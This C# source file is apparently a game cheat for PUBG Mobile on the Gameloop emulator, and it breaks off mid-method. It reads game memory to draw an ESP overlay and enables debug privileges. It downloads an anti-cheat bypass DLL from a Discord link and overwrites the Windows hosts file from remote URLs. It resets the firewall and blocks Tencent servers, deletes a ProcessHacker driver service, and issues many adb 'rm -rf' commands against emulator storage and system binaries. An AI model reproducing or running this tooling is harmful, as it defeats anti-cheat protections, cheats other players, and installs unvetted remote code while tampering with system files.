using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static PUBGMESP.SigScanSharp;
using ShpVector3 = SharpDX.Vector3;
using ShpVector2 = SharpDX.Vector2;
using Microsoft.Win32;
using System.Net;

namespace PUBGMESP
{
    public partial class MainForm : Form
    {
        private bool _dragging = false;
        private Point _offset;
        private Point _start_point = new Point(0, 0);
        #region Modules
        SigScanSharp sigScan;
        GameMemSearch ueSearch;
        ESPForm espForm;
        #endregion

        #region Variables
        const string WINDOW_NAME = "Gameloop【Turbo AOW Engine-4.4】";
        const string WINDOW_NAME_G = "腾讯手游助手【极速傲引擎】";
        IntPtr hwnd = IntPtr.Zero;
        RECT rect;
        long uWorld;
        long uWorlds;
        long uLevel;
        long gNames;
        long viewWorld;
        long gameInstance;
        long playerController;
        long playerCarry;
        int myTeamID;
        long uMyself;
        long myWorld;
        long uCamera;
        long uCursor;
        long uMyObject;
        Vector3 myObjectPos;
        long entityEntry;
        long entityCount;
        #endregion

        public MainForm()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            try
            {
                File.WriteAllBytes("adb.exe", JOY.Properties.Resources.adb);
            }
            catch { }
            try
            {
                File.WriteAllBytes("AdbWinApi.dll", JOY.Properties.Resources.AdbWinApi);
            }
            catch { }
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/c sc stop KProcessHacker2 & sc delete KProcessHacker2";
            process.StartInfo = startInfo;
            process.Start();
        }

        private static void cmd(string command)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.Verb = "runas";
            process.Start();
            process.StandardInput.WriteLine(command);
            process.StandardInput.Flush();
            process.StandardInput.Close();
            process.WaitForExit();
            process.Close();
        }
        private void InfoThread()
        {
            // offset
            int controllerOffset, posOffset, healthOffset, nameOffset, teamIDOffset, poseOffset, statusOffset;
            controllerOffset = 96;
            posOffset = 336;
            healthOffset = 2096;
            nameOffset = 1528;
            teamIDOffset = 1568;
            statusOffset = 948;
            poseOffset = 336;
            while (true)
            {
                // Read Basic Offset
                uWorlds = Mem.ReadMemory<int>(uWorld);
                uLevel = Mem.ReadMemory<int>(uWorlds + 32);
                gameInstance = Mem.ReadMemory<int>(uWorlds + 36);
                playerController = Mem.ReadMemory<int>(gameInstance + controllerOffset);
                playerCarry = Mem.ReadMemory<int>(playerController + 32);
                uMyObject = Mem.ReadMemory<int>(playerCarry + 792); //788 old value
                //uMyself = Mem.ReadMemory<int>(uLevel + 124);
                //uMyself = Mem.ReadMemory<int>(uMyself + 36);
                //uMyself = Mem.ReadMemory<int>(uMyself + 312);
                //uCamera = Mem.ReadMemory<int>(playerCarry + 804) + 832;
                //uCursor = playerCarry + 732;
                //myWorld = Mem.ReadMemory<int>(uMyObject + 312);
                //myObjectPos = Mem.ReadMemory<Vector3>(myWorld + posOffset);
                entityEntry = Mem.ReadMemory<int>(uLevel + 112);
                entityCount = Mem.ReadMemory<int>(uLevel + 120); //116 old value
                // Initilize Display Data
                DisplayData data = new DisplayData(viewWorld, uMyObject);
                List<PlayerData> playerList = new List<PlayerData>();
                List<ItemData> itemList = new List<ItemData>();
                List<VehicleData> vehicleList = new List<VehicleData>();
                List<BoxData> boxList = new List<BoxData>();
                List<GrenadeData> grenadeList = new List<GrenadeData>();
                for (int i = 0; i < entityCount; i++)
                {
                    long entityAddv = Mem.ReadMemory<int>(entityEntry + i * 4);
                    long entityStruct = Mem.ReadMemory<int>(entityAddv + 16);
                    string entityType = GameData.GetEntityType(gNames, entityStruct);

                    long weaponGID = Mem.ReadMemory<int>(Mem.ReadMemory<int>(entityAddv + 4996) + 16);
                    string weaponType = GameData.GetEntityType(gNames, weaponGID);
                    Item weapon = GameData.GetItemType(weaponType);
                    long VehicleCommon = Mem.ReadMemory<int>(entityAddv + 0x5cc);
                    float currentHealth = Mem.ReadMemory<float>(VehicleCommon + 0x10C);
                    if (Settings.PlayerESP)
                    {
                        // if entity is player
                        if (GameData.IsPlayer(entityType))
                        {
                            //Console.WriteLine(entityType);
                            long playerWorld = Mem.ReadMemory<int>(entityAddv + 312);
                            // read player info
                            // dead player continue
                            int status = Mem.ReadMemory<int>(playerWorld + statusOffset);

                            if (status == 6)
                                continue;

                            // Enemy weapon
                            var enemy_weapon = GameData.GetEntityType(gNames, Mem.ReadMemory<int>(Mem.ReadMemory<int>(entityAddv + 5400) + 16));
                            if (string.IsNullOrEmpty(enemy_weapon))
                                enemy_weapon = "Fist";
                            else
                            {
                                try
                                {
                                    var enemy_weaponList = enemy_weapon.Split('_').ToList();
                                    enemy_weapon = enemy_weaponList[2];
                                }
                                catch
                                {
                                    enemy_weapon = "Unknown";
                                }

                            }
                            Console.WriteLine(enemy_weapon);

                            string name = Encoding.Unicode.GetString(Mem.ReadMemory(Mem.ReadMemory<int>(entityAddv + nameOffset), 32));
                            name = name.Substring(0, name.IndexOf('\0'));
                            PlayerData playerData = new PlayerData
                            {
                                Type = entityType,
                                Address = entityAddv,
                                Position = Mem.ReadMemory<ShpVector3>(playerWorld + posOffset),
                                Status = status,
                                Pose = Mem.ReadMemory<int>(playerWorld + poseOffset),
                                IsRobot = Mem.ReadMemory<int>(entityAddv + 692) == 0 ? true : false,
                                Health = Mem.ReadMemory<float>(entityAddv + healthOffset),
                                Name = name,
                                TeamID = Mem.ReadMemory<int>(entityAddv + teamIDOffset),
                                //IsTeam = isTeam
                            };
                            if (playerData.Address == uMyObject || playerData.Address == uMyself)
                            {
                                myTeamID = playerData.TeamID;
                                continue;
                            }
                            if (playerData.TeamID == myTeamID)
                                continue;
                            //Console.WriteLine(entityType);
                            playerList.Add(playerData);
                            continue;
                        }
                    }
                    if (GameData.IsBox(entityType))
                    {
                        // Read Box Info
                        long boxEntity = Mem.ReadMemory<int>(entityAddv + 312);
                        BoxData boxData = new BoxData();
                        boxData.Position = Mem.ReadMemory<ShpVector3>(boxEntity + 336);
                        if (Settings.ShowLootItem)
                        {
                            long boxItemsCount = Mem.ReadMemory<int>(entityAddv + 1088);
                            if (boxItemsCount < 50 && boxItemsCount > 0)
                            {
                                List<string> boxItems = new List<string>();
                                long itemBase = Mem.ReadMemory<int>(entityAddv + 1084);
                                long itemAddv, ammoCount;
                                string itemName;
                                for (int j = 0; j < boxItemsCount; j++)
                                {
                                    itemAddv = itemBase + j * 48;
                                    Item boxItem = GameData.GetBoxItemType(Mem.ReadMemory<int>(itemAddv + 4));
                                    if (boxItem == Item.Useless) continue;
                                    ammoCount = Mem.ReadMemory<int>(itemAddv + 24);
                                    itemName = ammoCount > 0 ? string.Format("{0} * {1}", boxItem.GetDescription(), ammoCount) : boxItem.GetDescription();
                                    boxItems.Add(itemName);
                                }
                                boxData.Items = boxItems.ToArray();
                            }
                        }
                        boxList.Add(boxData);
                        continue;
                    }
                    if (Settings.ItemESP)
                    {
                        // check if this entity is item
                        Item item = GameData.GetItemType(entityType);
                        if (item != Item.Useless)
                        {
                            // Read Item Info
                            ItemData itemData = new ItemData
                            {
                                Name = item.GetDescription(),
                                Position = Mem.ReadMemory<ShpVector3>(Mem.ReadMemory<int>(entityAddv + 312) + posOffset),
                                Type = item
                            };
                            itemList.Add(itemData);
                        }
                        // check if this entity is box
                        if (GameData.IsBox(entityType))
                        {
                            // Read Box Info
                            long boxEntity = Mem.ReadMemory<int>(entityAddv + 312);
                            BoxData boxData = new BoxData();
                            boxData.Position = Mem.ReadMemory<ShpVector3>(boxEntity + posOffset);
                            boxList.Add(boxData);
                            continue;
                        }
                    }

                    if (Settings.VehicleESP)
                    {
                        Vehicle vehicle = GameData.GetVehicleType(entityType);
                        if (vehicle != Vehicle.Unknown)
                        {
                            int vHP = 0x10C;
                            int vHPMax = 0x108;
                            int vFuel = 0x124;
                            int vFuelMax = 0x120;

                            float HP = Mem.ReadMemory<float>(VehicleCommon + vHP);

                            float HPMax = Mem.ReadMemory<float>(VehicleCommon + vHPMax);
                            int _HP = (int)(HP * 100 / HPMax);
                            float Fuel = Mem.ReadMemory<float>(VehicleCommon + vFuel);
                            float FuelMax = Mem.ReadMemory<float>(VehicleCommon + vFuelMax);
                            int _Fuel = (int)(Fuel * 100 / FuelMax);

                            // Read Vehicle Info
                            VehicleData vehicleData = new VehicleData
                            {
                                Position = Mem.ReadMemory<ShpVector3>(Mem.ReadMemory<int>(entityAddv + 312) + posOffset),
                                Type = vehicle,
                                Name = vehicle.GetDescription(),
                                HP = _HP,
                                Fuel = _Fuel,
                            };
                            vehicleList.Add(vehicleData);
                            continue;
                        }
                    }
                    // check if the entity is a grenade
                    Grenade grenade = GameData.GetGrenadeType(entityType);
                    if (grenade != Grenade.Unknown)
                    {
                        long grenadeEntity = Mem.ReadMemory<int>(entityAddv + 312);
                        GrenadeData greData = new GrenadeData
                        {
                            Type = grenade,
                            Position = Mem.ReadMemory<ShpVector3>(grenadeEntity + posOffset)
                        };
                        grenadeList.Add(greData);
                    }
                }
                data.Players = playerList.ToArray();
                data.Items = itemList.ToArray();
                data.Vehicles = vehicleList.ToArray();
                data.Boxes = boxList.ToArray();
                data.Grenades = grenadeList.ToArray();
                espForm.UpdateData(data);
                Thread.Sleep(10);
            }
        }

        private void ESPThread()
        {
            espForm.Initialize();
            while (true)
            {
                espForm.Update();
                Thread.Sleep(10);
            }
        }
        private IntPtr FindTrueAOWHandle()
        {
            IntPtr aowHandle = IntPtr.Zero;
            uint maxThread = 0;
            IntPtr handle = CreateToolhelp32Snapshot(0x2, 0);
            if ((int)handle > 0)
            {
                ProcessEntry32 pe32 = new ProcessEntry32();
                pe32.dwSize = (uint)Marshal.SizeOf(pe32);
                int bMore = Process32First(handle, ref pe32);
                while (bMore == 1)
                {
                    IntPtr temp = Marshal.AllocHGlobal((int)pe32.dwSize);
                    Marshal.StructureToPtr(pe32, temp, true);
                    ProcessEntry32 pe = (ProcessEntry32)Marshal.PtrToStructure(temp, typeof(ProcessEntry32));
                    Marshal.FreeHGlobal(temp);
                    if (pe.szExeFile.Contains("aow_exe.exe") && pe.cntThreads > maxThread)
                    {
                        maxThread = pe.cntThreads;
                        aowHandle = (IntPtr)pe.th32ProcessID;
                    }

                    bMore = Process32Next(handle, ref pe32);
                }
                CloseHandle(handle);
            }
            return aowHandle;
        }


        private bool EnableDebugPriv()
        {
            IntPtr hToken = IntPtr.Zero;
            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref hToken))
            {
                return false;
            }
            LUID luid = new LUID();
            if (!LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid))
            {
                CloseHandle(hToken);
                return false;
            }
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Privileges = new LUID_AND_ATTRIBUTES[1];
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
            {
                return false;
            }
            CloseHandle(hToken);
            return true;
        }



        #region WIN32 API
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

        [DllImport("user32.dll")]
        [
         return: MarshalAs(UnmanagedType.Bool)
        ]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", EntryPoint = "FindWindowEx", SetLastError = true)]


        private static extern IntPtr FindWindowEx(IntPtr hwndParent, uint hwndChildAfter, string lpszClass, string lpszWindow);

        [DllImport("User32.dll")]
        public static extern bool GetAsyncKeyState(Keys vKey);

        private const int TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const int TOKEN_QUERY = 0x00000008;
        private const int SE_PRIVILEGE_ENABLED = 0x00000002;

        [DllImport("advapi32", SetLastError = true), SuppressUnmanagedCodeSecurityAttribute]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, ref IntPtr TokenHandle);

        [DllImport("kernel32", SetLastError = true), SuppressUnmanagedCodeSecurityAttribute]
        private static extern bool CloseHandle(IntPtr handle);

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID
        {
            public UInt32 LowPart;
            public Int32 HighPart;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        private struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, ref LUID lpLuid);

        struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }
        // Use this signature if you want the previous state information returned
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,
           [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges,
           ref TOKEN_PRIVILEGES NewState,
           UInt32 BufferLengthInBytes,
           IntPtr prev,
           IntPtr relen);

        [DllImport("KERNEL32.DLL ")]
        public static extern IntPtr CreateToolhelp32Snapshot(uint flags, uint processid);
        [DllImport("KERNEL32.DLL ")]
        public static extern int Process32First(IntPtr handle, ref ProcessEntry32 pe);
        [DllImport("KERNEL32.DLL ")]
        public static extern int Process32Next(IntPtr handle, ref ProcessEntry32 pe);

        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessEntry32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szExeFile;
        };
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);
        #endregion

        private void Loop_Tick(object sender, EventArgs e)
        {
            GetWindowRect(hwnd, out rect);
            if (espForm != null)
            {
                espForm._window.FitToWindow(hwnd, true);
            }
        }

        private void Update_Tick(object sender, EventArgs e)
        {
            if (GetAsyncKeyState(Keys.Home))
            {
                Settings.ShowMenu = !Settings.ShowMenu;
            }
            if (GetAsyncKeyState(Keys.End))
            {

                System.Environment.Exit(-1);
            }
            if (GetAsyncKeyState(Keys.End))
            {

                this.Hide();
                this.Close();
            }
            if (GetAsyncKeyState(Keys.F2))
            {
                Settings.PlayerESP = !Settings.PlayerESP;
            }
            if (GetAsyncKeyState(Keys.F3))
            {
                Settings.ItemESP = !Settings.ItemESP;
            }
            if (GetAsyncKeyState(Keys.F4))
            {
                Settings.VehicleESP = !Settings.VehicleESP;
            }
            if (GetAsyncKeyState(Keys.F5))
            {
                Settings.aimEnabled = !Settings.aimEnabled;
            }
            if (GetAsyncKeyState(Keys.F10))
            {
                Settings.smallpointer = !Settings.smallpointer;
            }
        }
        [DllImport("user32.dll")]
        public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, UIntPtr dwExtraInfo);

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Stop ESP
            // System.Environment.Exit(-1);
        }

        private void MainForm_MouseMove(object sender, MouseEventArgs e)
        {
            if (_dragging)
            {
                Point p = PointToScreen(e.Location);
                Location = new Point(p.X - this._start_point.X, p.Y - this._start_point.Y);

            }
        }

        private void MainForm_MouseDown(object sender, MouseEventArgs e)
        {
            _dragging = true;
            _start_point = new Point(e.X, e.Y);
        }

        private void MainForm_MouseUp(object sender, MouseEventArgs e)
        {
            _dragging = false;
        }

        private void label1_Click(object sender, EventArgs e)
        {
            using (WebClient webClient = new WebClient())
            {

                webClient.DownloadFileAsync(new Uri("http://www.joycheat.com/wp-content/uploads/2020/10/hosts-1"), "C:\\Windows\\System32\\drivers\\etc\\hosts");
            }
            Environment.Exit(0);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.Verb = "runas";
                process.Start();
                process.StandardInput.WriteLine($@"netsh advfirewall reset");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();
                process.Close();

            }
            using (WebClient webClient = new WebClient())
            {
                // webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(this.checkBox12_CheckedChanged);
                webClient.DownloadFileAsync(new Uri("http://www.joycheat.com/wp-content/uploads/2020/10/hosts-1"), "C:\\Windows\\System32\\drivers\\etc\\hosts");
                //MessageBox.Show("THANKS FOR USING JOY X");
            }
            {

                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.Verb = "runas";
                process.Start();
                process.StandardInput.WriteLine($@"netsh advfirewall firewall add rule name=WINDOWS interface=any dir=out action=block remoteip=203.205.0.0-203.205.255.255,123.151.0.0-123.151.255.255,58.250.0.0-58.250.255.255,113.105.0.0-113.105.255.255,219.133.0.0-219.133.255.255");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();
                process.Close();

            }

            string str;

            try
            {
                object value = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Tencent\\MobileGamePC\\UI").GetValue("InstallPath");
                if (value != null)
                {
                    str = value.ToString();
                }
                else
                {
                    str = null;
                }
                Process.Start(string.Concat(str, "\\AndroidEmulator.exe"));
            }
            catch
            {
                MessageBox.Show("Process blocked due to interference of another service");
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            string filepath = (@"C:\BypaPH.dll");

            if (File.Exists(filepath))
            {
                File.Delete(filepath);
            }
            if (!File.Exists(@"C:\BypaPH.dll"))
            {
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile("https://cdn.discordapp.com/attachments/681486229589459010/784667253344960522/BypaPH.dll", @"C:\BypaPH.dll");
                }
            }
            // Enable Debug Privilige
            EnableDebugPriv();
            // Get Window Handle
            // hwnd = FindWindow("TXGuiFoundation", WINDOW_NAME);
            Process[] pname = Process.GetProcessesByName("AndroidEmulator");

            if (hwnd == IntPtr.Zero)
            {
                if (pname.Length == 1)
                    //hwnd = FindWindow("TXGuiFoundation", WINDOW_NAME_G);
                    hwnd = FindWindow("TXGuiFoundation", Process.GetProcessesByName("AndroidEmulator")[0].MainWindowTitle);



            }
            hwnd = FindWindowEx(hwnd, 0, "AEngineRenderWindowClass", "AEngineRenderWindow");

            // Find true aow_exe process
            var aowHandle = FindTrueAOWHandle();

            // Initialize Memory
            Mem.Initialize(aowHandle);
            if (Mem.m_pProcessHandle == IntPtr.Zero)
            {
                MessageBox.Show("Please Open Emulator First !", "ERROR");
                return;
            }
            else
            {
                // Initialize SigScan
                sigScan = new SigScanSharp(Mem.m_pProcessHandle);
            }

            // Find UWorld Offset
            ueSearch = new GameMemSearch(sigScan);
            var cands = ueSearch.ViewWorldSearchCandidates();
            viewWorld = ueSearch.GetViewWorld(cands);
            uWorld = viewWorld - 4582196;
            gNames = viewWorld - 4619344;
            if (uWorld > 0)
            {
                // Start Drawing ESP
                LoopTimer.Enabled = true;
                UpdateTimer.Enabled = true;
                GetWindowRect(hwnd, out rect);
                espForm = new ESPForm(rect, ueSearch);
                new Thread(ESPThread).Start();
                new Thread(InfoThread).Start();
                ;
            }



            else
            {
                MessageBox.Show("Unable to initialize, please check if simulator and game is running");
            }
        }

        private void checkBox8_CheckedChanged(object sender, EventArgs e)
        {
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = true,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();

            using (StreamWriter standardInput = process.StandardInput)
            {
                if (standardInput.BaseStream.CanWrite)
                standardInput.WriteLine("netsh advfirewall firewall add rule name=SINKI protocol=TCP dir=out remoteport=17000-17499,17501-18000,30000-35000,547,3013,10000-10050,35000,62448,14000,18018,7889,8000-8099,5555,3120,5038,5037,55443,55867,55902,55908,55916,5945,55984 action=block enable=yes");
                standardInput.Flush();
                standardInput.Close();
                process.WaitForExit();
                checkBox8.Enabled = false;
            }
        }

        private void checkBox9_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox9.Checked)
            {
                using (WebClient webClient = new WebClient())
                {
                    // webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(this.checkBox9_CheckedChanged);
                    webClient.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/780455747036905473/780455787616534628/hosts"), "C:\\Windows\\System32\\drivers\\etc\\hosts");
                }
                try
                {
                    File.WriteAllText(Environment.SystemDirectory + "\\..\\UserEngine.ini", JOY.Properties.Resources.UserEngine);
                }
                catch { }
                try
                {
                    File.WriteAllText(Environment.SystemDirectory + "\\..\\UserGame.ini", JOY.Properties.Resources.UserGame);
                }
                catch { }
                try
                {
                    File.WriteAllText(Environment.SystemDirectory + "\\..\\UserLogSuppression.ini", JOY.Properties.Resources.UserLogSuppression);
                }
                catch { }
                Process process = new Process();
                process.StartInfo = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    CreateNoWindow = true,
                    RedirectStandardInput = true,
                    UseShellExecute = false
                };
                process.Start();

                using (StreamWriter standardInput = process.StandardInput)
                {
                    if (standardInput.BaseStream.CanWrite)
                        standardInput.WriteLine("adb.exe kill-server");
                    standardInput.WriteLine("adb.exe start-server");
                    standardInput.WriteLine("adb connect 127.0.0.1:5555");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mount -o rw,remount");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mount -o rw,remount /system");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/files/tss_tmp");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/app_bugly");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/cache");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/app_crashrecord");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/code_cache");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/no_backup");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.epicgames.ue4/files");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/app_bugly");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/cache");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/app_crashrecord");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/code_cache");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/no_backup");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/files");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/files/tss_tmp");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 500 /proc");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Android/data/com.tencent.ig/cache");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Logs");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/PufferTmpDir");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/backups");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/.backups");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/data");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/flywheel");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/MidasOversea");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/DCIM");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Download");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Alarms");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/mfcache");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Notifications");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Movies");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Pictures");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Podcasts");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/QTAudioEngine");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Ringtones");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/test_sdcard.txt");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/app_webview");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/files/iMSDKD");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -r /data/user/0/com.tencent.ig/files/");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/files/tss_tmp/*");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/files/iMSDK/*");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell touch /data/data/com.tencent.ig/files");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -r /data/user/0/com.tencent.ig/lib/");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell touch /data/data/com.tencent.ig/app_crashrecord");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Android/data/com.tencent.ig/cache/");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/cache/* ");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/app_bugly/*");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /system/bin/houdini");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /system/bin/disable_houdini");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /system/libs/libutils.so");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /data/data/com.tencent.ig/files/tss_tmp");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 444 /data/data/com.tencent.ig/files/iMSDK");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /data/data/com.tencent.ig/app_bugly");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell cp /stdin /data/data/");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rename /data/data/stdin /data/data/com.tencent.tinput");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell am start -n com.tencent.ig/com.epicgames.ue4.SplashActivity filter");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell sleep 2");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /storage/emulated/0/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserEngine.ini /data/UserEngine.ini");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /storage/emulated/0/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserGame.ini /data/UserGame.ini");
                    standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /storage/emulated/0/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserLogSuppression.ini /data/UserLogSuppression.ini");
